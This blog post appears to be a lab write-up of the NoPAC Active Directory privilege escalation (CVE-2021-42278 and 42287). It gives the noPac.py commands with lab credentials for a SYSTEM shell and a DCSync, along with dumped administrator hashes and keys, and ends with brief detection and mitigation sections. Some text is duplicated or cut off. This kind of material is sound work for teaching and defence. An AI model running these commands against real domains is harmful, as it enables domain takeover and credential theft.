---
title: The NoPAC Attack
date: 2025-07-08 19:27:02
tags:
- nopac
- AD
- Active Directory
- Lateral Movement

description: "NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins"
---
![alt text](images/NOPACK.png)

## Introduction
NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins

|CVE|Description|
|---|---|
|42278 | 42278 is a bypass vulnerability with the Security Account Manager (SAM). |
|42287 | 42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|

<!-- more -->

### AD Kerberos Authentication
A ticket-granting-ticket (TGT) is a ticket assigned to a user that is used to authenticate to the KDC and request a service ticket from the ticket-granting-service (TGS). Service tickets are granted for authentication against services.
![KDC](../images/npac.png) Figure. Kerberos authentication process
    
---

##  CVEs 2021-42278 and 2021-42287
This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.


|CVE|Description|
|---|---|
|42278 | 42278 is a bypass vulnerability with the Security Account Manager (SAM). |
|42287 | 42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|

<br>

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain.


When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. 

When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.

The tickets are distributed by the Key Distribution Center (KDC). In AD environments, the KDC is installed on the Domain Controller (DC).




with the attack:
Adversaries can leverage these two vulnerabilities together to escalate to domain admin privileges from a standard domain user.

How It Works

Machine account creation
Service Principal Names (SPNs) are cleared
sAMAccountName is renamed to the DC name without a $
Ticket-granting-ticket (TGT) is requested
sAMAccountName is renamed with a different name
Service ticket requested with S4U2self extension

In November 9, 2021: Microsoft released initial security updates that addressed both CVE‑2021‑42278 (SAM spoofing) and CVE‑2021‑42287 (Kerberos PAC bypass)
[support.microsoft.com+15](https://support.microsoft.com/en-us/topic/kb5011266)


## Setup:
#### Ensuring Impacket is Installed

```shell-session
magdy3660@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
```


```shell-session
magdy3660@htb[/htb]$ python setup.py install 
```

#### Cloning the NoPac Exploit Repo

```shell-session
magdy3660@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```
Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite 

---
#### Running NoPac

```shell-session
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```


We will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

#### Confirming the Location of Saved Tickets

```shell-session
$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

 `Using noPac to DCSync the Built-in Administrator Account`
```shell-session
$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

                                                                    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

## Detection
Exploiting the noPac vulnerability generates the following Security Auditing Windows event logs.
![alt text](../images/kb.png)


## Mitigations
Microsoft’s patch adds Security Accounts Manager Hardening changes along with Key Distribution Center (KDC) authentication updates.

These changes prevent sAMAccountName spoofing by adding validation for a computer account’s sAMAccountName ending in a single dollar sign. The original requester will also be added to the PAC of the TGT, helping prevent domain controller impersonation.